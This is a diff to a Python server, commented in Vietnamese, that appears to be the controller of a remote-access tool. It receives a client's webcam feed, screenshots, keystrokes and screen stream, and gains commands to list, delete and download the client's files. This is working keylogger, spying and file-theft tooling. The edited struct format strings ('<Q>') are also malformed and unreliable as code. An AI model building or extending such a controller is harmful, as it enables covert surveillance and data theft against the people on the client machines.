@@ -2,8 +2,38 @@ import socket
 import struct
 import cv2
 import numpy as np
+def receive_file(conn, filename):
+    print(f"Đang tải file {filename} từ Client...")
+    
+    # Dùng chuẩn <Q> (8-bytes) để không bị lệch hệ điều hành
+    payload_size = struct.calcsize("<Q>")
+    raw_msglen = recvall(conn, payload_size)
+    if not raw_msglen:
+        print("Lỗi đường truyền: Không nhận được kích thước file.")
+        return
+        
+    msglen = struct.unpack("<Q>", raw_msglen)[0]
 
+    if msglen == 0:
+        print("Lỗi: File không tồn tại hoặc bị từ chối truy cập từ Client!")
+        return
 
+    # Quá trình Chunking lúc nhận: Hứng từng lát 4KB và lưu ngay xuống đĩa
+    save_path = f"downloaded_{filename}"
+    with open(save_path, 'wb') as f:
+        bytes_received = 0
+        while bytes_received < msglen:
+            # Tính toán xem nên hứng 4096 bytes hay hứng phần vụn còn sót lại
+            chunk_size = min(4096, msglen - bytes_received)
+            chunk = conn.recv(chunk_size)
+            if not chunk:
+                print("\n[-] Lỗi: Đứt mạng giữa chừng khi đang tải!")
+                break
+            f.write(chunk)
+            bytes_received += len(chunk)
+            
+    print(f"Đã tải xong! File được lưu tại: {save_path}")
+    
 def recvall(conn, n):
     data = bytearray()
     while len(data) < n:
@@ -13,16 +43,15 @@ def recvall(conn, n):
         data.extend(packet)
     return data
 
-
 def receive_stream(conn):
     print("Đang nhận luồng Webcam... (Bấm 'q' trên cửa sổ video để thoát)")
-    payload_size = struct.calcsize("L")
+    payload_size = struct.calcsize("<Q>")
 
     while True:
         raw_msglen = recvall(conn, payload_size)
         if not raw_msglen:
             break
-        msglen = struct.unpack("L", raw_msglen)[0]
+        msglen = struct.unpack("<Q>", raw_msglen)[0]
 
         frame_data = recvall(conn, msglen)
         if frame_data is None:
@@ -41,14 +70,14 @@ def receive_stream(conn):
 # --- HÀM NHẬN ẢNH CHỤP MÀN HÌNH MỚI THÊM VÀO ---
 def receive_screenshot(conn):
     print("Đang nhận dữ liệu ảnh màn hình từ Client...")
-    payload_size = struct.calcsize("L")
+    payload_size = struct.calcsize("<Q>")
 
     # B1: Nhận 4 bytes kích thước
     raw_msglen = recvall(conn, payload_size)
     if not raw_msglen:
         print("Không nhận được kích thước ảnh.")
         return
-    msglen = struct.unpack("L", raw_msglen)[0]
+    msglen = struct.unpack("<Q>", raw_msglen)[0]
 
     frame_data = recvall(conn, msglen)
     if frame_data is None:
@@ -77,28 +106,28 @@ def receive_key_logger(conn):
             break
         print(decoded_data, end='', flush=True)
 
-
 def receive_screen(conn):
     print("Đang nhận luồng chia sẻ màn hình... (Bấm 'q' trên cửa sổ video để thoát)")
-    payload_size = struct.calcsize("L")
+    payload_size = struct.calcsize("<Q>")
     while True:
         raw_msglen = recvall(conn, payload_size)
         if not raw_msglen:
             break
-        msglen = struct.unpack("L", raw_msglen)[0]
-
+        msglen = struct.unpack("<Q>", raw_msglen)[0]
+        
         frame_data = recvall(conn, msglen)
         if frame_data is None:
             break
-
+            
         nparr = np.frombuffer(frame_data, np.uint8)
         frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+        
 
         cv2.imshow('Live Screen Sharing', frame)
-
+        
         if cv2.waitKey(1) & 0xFF == ord('q'):
             break
-
+            
     cv2.destroyAllWindows()
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -138,6 +167,24 @@ try:
                     receive_key_logger(conn)
                 elif cmd == 'screen':
                     receive_screen(conn)
+
+                elif cmd == 'list_files':
+                    # Chờ nhận bản text danh sách file từ Client và in ra
+                    response = conn.recv(4096).decode('utf-8', errors='ignore')
+                    print(f"\n--- DANH SÁCH FILE TRONG SANDBOX ---\n{response}\n---")
+                    
+                elif cmd.startswith('delete_file '):
+                    # Chờ nhận thông báo kết quả xóa (thành công hay thất bại)
+                    response = conn.recv(1024).decode('utf-8', errors='ignore')
+                    print(f">>> {response}")
+                    
+                elif cmd.startswith('download_file '):
+                    # Tách lệnh ra để lấy tên file, sau đó gọi hàm nhận file
+                    try:
+                        _, filename = cmd.split(' ', 1)
+                        receive_file(conn, filename)
+                    except ValueError:
+                        print("Lỗi cú pháp. Hãy gõ đúng định dạng: download_file <ten_file>")
 
         except (socket.error, ConnectionResetError, BrokenPipeError) as e:
             print(f"\n[-] Client connection lost abruptly: {e}")
